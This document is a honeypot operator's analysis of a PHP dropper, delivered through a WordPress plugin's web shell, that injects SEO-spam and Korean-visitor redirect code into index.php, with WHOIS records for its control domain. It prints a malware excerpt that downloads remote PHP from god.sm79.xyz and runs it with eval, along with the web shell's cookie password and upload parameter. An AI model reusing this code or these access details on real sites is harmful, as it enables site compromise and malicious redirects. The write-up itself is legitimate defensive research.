# gsptg.php: ring.php download

The [login_wall plugin](/plugins/login_wall) (which is full of PHP malware)
includes [ring.php](/plugins/login_wall/ring_decoded),
a web shell.

IP address 192.154.105.154 has insisted on trying to access `ring.php` URLs.
Those accesses seem to always download a new piece of PHP, `gsptg.php`.

`gsptg.php` seems to try to convince web crawlers, spiders, search engines and bots
to come back often, but it also sends users either referred by .kr domains,
or using Korean language in their browsers off to new URLs.

## Origin

### IP Address 192.154.105.154

At least 2 IP addresses, 107.150.127.57 and 198.98.123.140 have sent my WordPress honey pot
a login_wall plugin .zip file, but only 192.154.105.154 has tried to invoke a `ring.php` URL.

192.154.105.154 has a 192-154-105-154.static.gorillaservers.com reverse DNS lookup.
192-154-105-154.static.gorillaservers.com does not have a DNS A record.

192.154.105.154 lies in 192.154.96.0/20, AS53850, owned by GorillaServers, Inc,
a Los Angeles, CA, USA company that rents out dedicated servers.

Could be anybody.

### Download

The download to my WordPress honey pot isn't particularly ordinary.
I modified the WSO (Web Shell by oRb) component of my WordPress honey pot
to recognize access via a URL ending in `ring.php`.

`ring.php` effectively has a password in a cookie named "_f_wp".
This download had a cookie named "_f_wp" with a value "G0YgIaXqx",
which allows the execution of `ring.php`.

An additional POST parameter named "fe" had a value of "upload".
This parameter means `ring.php` should upload a file.
The WSO component of my honey pot understands this,
and saved the uploaded code.
That code was to be named `gsptg.php`.

The [uploaded file](192.154.105.154XLCpgV3KcffaYNVnWiywkAAAAAM.0.file) contains
some obfuscated PHP.

## Deobfuscation

All of the deobfuscation can be accomplished by changing an invocation of PHP's
builtin `eval` to `print`, executing the PHP and saving the output in a new file.

I ended up pretty-printing the [de-obfuscated code](dc5.php) for readability.

## Analysis

The coding style is decent, albeit somewhat uneven.
Functions appear to be named according to two conventions:

1. `_get_temp_dir_mass()` - snake_case with an odd leading underscore.
2. `isBot()` and `hashCode()` - camelCase.

The functions named with leading underscores are exceedingly paranoid.
They try every method of determining an answer known to man.
They always return an answer.
The camelCase functions seem more typical of PHP malware - a little sloppy,
they'll work most of the time but fail miserably in some corner cases.

### Dropper

The attacker's file `gsptg.php` is actually little more than a dropper.
The [dropper](f1.php) starts by composing no more than 2 file names,
both ending in "index.php".
One path ends up as `index.php` in Apache's DocumentRoot directory.
The optional second path ends up as `index.php`
in the WordPress directory.

If either or both of the `index.php` files do not contain the string "shaputiangou1",
the dropper writes some [obfuscated PHP](dc3.php) into the file.
The dropper also creates an empty marker file named "shaputiangou.txt".

The string "shaputiangou1" exists in the obfuscated PHP to keep an `index.php`
file on a compromised WordPress site from getting written to by another instance
of the dropper more than once.
This would imply that the [login_wall plugin](/plugins/login_wall)
gets uploaded to a given compromised WordPress site more than once
often enough for double-injecting to consistute an irritation.

I'm not sure what the empty file `shaputiangou.txt` does.
Nothing else seems to reference it.

### Code put in `index.php`

The [code](f2.php) written to one or more `index.php` files
would execute its [payload](`payload.php`),
then execute WordPress via

    @(require dirname(__FILE__) . "/wp-blog-header.php");

I'm not certain how Apache web server's `mod_dir.so`,
would interact with the payload code.
Certainly the `index.php` file in the WordPress directory would execute,
then invoke WordPress.
If you don't know that injected code exists, 
it probably appears that WordPress works perfectly fine.

The interaction with `mod_dir.so` would happen if the payload gets
invoked as something other than `/` or `index.php`.
The payload code performs different actions when invoked as different URLs.

#### Payload invoked as URI with sitemap.xml in it

If the URL it gets invoked by has "sitemap.xml" in it,
the payload code composes a Google site map XML file.

I hacked [the code](sitemap_gen.php) out of `payload.php` that does this.
I'm no expert at Google site maps,
but the [XML file it generates](example.sitemap.xml) looks like it claims 100 randomly-named URLs are refreshed daily.
At the very least, this should get sensible spiders (like, perhaps, Googlebot) to revisit the compromised WordPress site daily.

#### Payload invoke with URL that ends in "google16e3a357341375c6.html"

    die('google-site-verification: google16e3a357341375c6.html');


I almost think this won't do what I think it's supposed to do,
which is make Google think that the `payload.php` file is part of someone's web pages. 
But maybe it does.

The "google16e3a357341375c6.html" named shows up [elsewhere on the web](https://malwaredecoder.com/result/d88b5c318b1686eac98a6b1499d5d507).
That appearance might be a test of the payload code, or it might be someone else found this goofy malware.

#### Referrer host name ends in ".kr" or Accept-Language has "ko" in it

If the invoking URL isn't "google16e3a357341375c6.html" or "sitemap.xml",
the payload code looks at th referring site,
and the language preference sent by the user's browser.

"ko" is "Korean", right?

    if (strpos(strtolower(@$_SERVER['HTTP_REFERER']), ".kr") !== false || strpos(strtolower(@$_SERVER['HTTP_ACCEPT_LANGUAGE']), "ko") !== false) {
        $local_url = _local_url();
        $html = base64_decode(_get_between(_get_cache('http://god.sm79.xyz/api.php?g=gitt'), "->|", "|<-"));
        eval($html);
        $Data_arr = _get_static_arr($local_url . 'Data_arr', $Main_arr["data"]);
        $sc_arr = explode('|', _get_static_arr($local_url . "sitel1", $Data_arr['site']));
        die('<!DOCTYPE html><html><body><script>document.location=("' . @trim($sc_arr[0]) . '");</script></body></html>');
    }

Apparently this sends back JavaScript that redirects the accessor's browser to some other URL.
The other URL depends on what URL the payload is invoked by.
Some PHP gets downloaded from http://god.sm79.xyz/api.php.
A domain name gets chosen from that PHP via hashing the invoking URL.
The PHP downloaded gets cached for re-use later.

The cached PHP is a very elaborate hash-of-hashes, but I believe that in the example PHP I downloaded,
a Korean human would end up getting redirected to one of:

* http://mss798.com
* http://tpe863.com
* http://ntk455.com
* http://wpf636.com
* http://qbx488.com
* http://fkh846.com

These are all hidden behind CloudFlare IP addresses.
CloudFlare denied my access of the URLs.

#### Downloaded cached PHP

The payload code caches the [PHP it downloads](sess_decoded.php) from http://god.sm79.xyz/api.php.
It appears like it has a lot more info in it than the payload code uses.

#### User Agent indicates crawler/spider/bot

If a user's browser isn't referred to the payload by a .kr domain name,
or the user's language preferences don't include Korean,
the payload checks to see if the browser is actually a "bot".

    function isBot()
    {
        return isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|spider|mediapartners|slurp|patrol/i', $_SERVER['HTTP_USER_AGENT']);
    }

A little weak, but it probably detects 80% of all crawlers/spiders/search engines.
A bot could circumvent the check by not sending a User Agent string at all.

The first time the payload code decides a bot has accessed it,
it downloads and caches PHP from the same URL the Korean-redirector section of the payload uses.
This part of the code uses a different section of the downloaded, cached PHP.


#### god.sm79.xyz

Non-authoritative answer:
Name:	god.sm79.xyz
Address: 104.27.169.102
Name:	god.sm79.xyz
Address: 104.27.168.102
Name:	god.sm79.xyz
Address: 2606:4700:30::681b:a866
Name:	god.sm79.xyz
Address: 2606:4700:30::681b:a966

The queried object does not exist: DOMAIN NOT FOUND
Domain Name: SM79.XYZ
Registry Domain ID: D83669519-CNIC
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: https://www.godaddy.com/
Updated Date: 2019-03-17T15:11:03.0Z
Creation Date: 2018-11-17T05:38:35.0Z
Registry Expiry Date: 2019-11-17T23:59:59.0Z
Registrar: Go Daddy, LLC
Registrar IANA ID: 146
Domain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Registrant Organization:
Registrant State/Province: Shaanxi
Registrant Country: CN
Registrant Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Admin Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Tech Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Name Server: BETTY.NS.CLOUDFLARE.COM
Name Server: DUKE.NS.CLOUDFLARE.COM
DNSSEC: unsigned
Billing Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Registrar Abuse Contact Email: abuse@godaddy.com
Registrar Abuse Contact Phone: +1.4805058800
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of WHOIS database: 2019-04-13T23:08:14.0Z <<<

For more information on Whois status codes, please visit https://icann.org/epp

>>> IMPORTANT INFORMATION ABOUT THE DEPLOYMENT OF RDAP: please visit
https://www.centralnic.com/support/rdap <<<

The Whois and RDAP services are provided by CentralNic, and contain
information pertaining to Internet domain names registered by our
our customers. By using this service you are agreeing (1) not to use any
information presented here for any purpose other than determining
ownership of domain names, (2) not to store or reproduce this data in
any way, (3) not to use any high-volume, automated, electronic processes
to obtain data from this service. Abuse of this service is monitored and
actions in contravention of these terms will result in being permanently
blacklisted. All data is (c) CentralNic Ltd (https://www.centralnic.com)

Access to the Whois and RDAP services is rate limited. For more
information, visit https://registrar-console.centralnic.com/pub/whois_guidance.
The queried object does not exist: DOMAIN NOT FOUND

#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2019, American Registry for Internet Numbers, Ltd.
#


NetRange:       104.16.0.0 - 104.31.255.255
CIDR:           104.16.0.0/12
NetName:        CLOUDFLARENET
NetHandle:      NET-104-16-0-0-1
Parent:         NET104 (NET-104-0-0-0-0)
NetType:        Direct Assignment
OriginAS:       AS13335
Organization:   Cloudflare, Inc. (CLOUD14)
RegDate:        2014-03-28
Updated:        2017-02-17
Comment:        All Cloudflare abuse reporting can be done via https://www.cloudflare.com/abuse
Ref:            https://rdap.arin.net/registry/ip/104.16.0.0



OrgName:        Cloudflare, Inc.
OrgId:          CLOUD14
Address:        101 Townsend Street
City:           San Francisco
StateProv:      CA
PostalCode:     94107
Country:        US
RegDate:        2010-07-09
Updated:        2018-10-10
Comment:        All Cloudflare abuse reporting can be done via https://www.cloudflare.com/abuse
Ref:            https://rdap.arin.net/registry/entity/CLOUD14


OrgNOCHandle: NOC11962-ARIN
OrgNOCName:   NOC
OrgNOCPhone:  +1-650-319-8930 
OrgNOCEmail:  noc@cloudflare.com
OrgNOCRef:    https://rdap.arin.net/registry/entity/NOC11962-ARIN

OrgAbuseHandle: ABUSE2916-ARIN
OrgAbuseName:   Abuse
OrgAbusePhone:  +1-650-319-8930 
OrgAbuseEmail:  abuse@cloudflare.com
OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE2916-ARIN

OrgTechHandle: ADMIN2521-ARIN
OrgTechName:   Admin
OrgTechPhone:  +1-650-319-8930 
OrgTechEmail:  rir@cloudflare.com
OrgTechRef:    https://rdap.arin.net/registry/entity/ADMIN2521-ARIN

RTechHandle: ADMIN2521-ARIN
RTechName:   Admin
RTechPhone:  +1-650-319-8930 
RTechEmail:  rir@cloudflare.com
RTechRef:    https://rdap.arin.net/registry/entity/ADMIN2521-ARIN

RNOCHandle: NOC11962-ARIN
RNOCName:   NOC
RNOCPhone:  +1-650-319-8930 
RNOCEmail:  noc@cloudflare.com
RNOCRef:    https://rdap.arin.net/registry/entity/NOC11962-ARIN

RAbuseHandle: ABUSE2916-ARIN
RAbuseName:   Abuse
RAbusePhone:  +1-650-319-8930 
RAbuseEmail:  abuse@cloudflare.com
RAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE2916-ARIN


#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2019, American Registry for Internet Numbers, Ltd.
#

